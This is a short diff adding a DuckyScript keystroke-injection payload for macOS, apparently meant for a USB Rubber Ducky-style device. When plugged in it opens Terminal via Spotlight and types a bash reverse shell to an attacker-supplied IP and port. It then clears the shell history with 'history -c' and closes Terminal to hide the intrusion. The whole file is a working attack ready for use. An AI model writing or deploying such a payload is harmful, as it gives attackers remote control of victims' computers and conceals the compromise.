@@ -1,0 +1,20 @@
+REM replace YOUR-IPV4-ADRESS with your ipv4 
+REM replace YOUR-PORT with the port that you selected in your server
+DELAY 1000
+GUI SPACE
+DELAY 300
+STRING terminal
+DELAY 100
+ENTER
+DELAY 300
+STRING bash &> /dev/tcp/YOUR-IPV4-ADRESS/YOUR-PORT 0>&1
+ENTER
+DELAY 100
+STRING history -c
+ENTER
+DELAY 100
+GUI q
+DELAY 100
+GUI SPACE
+DELETE
+GUI SPACE
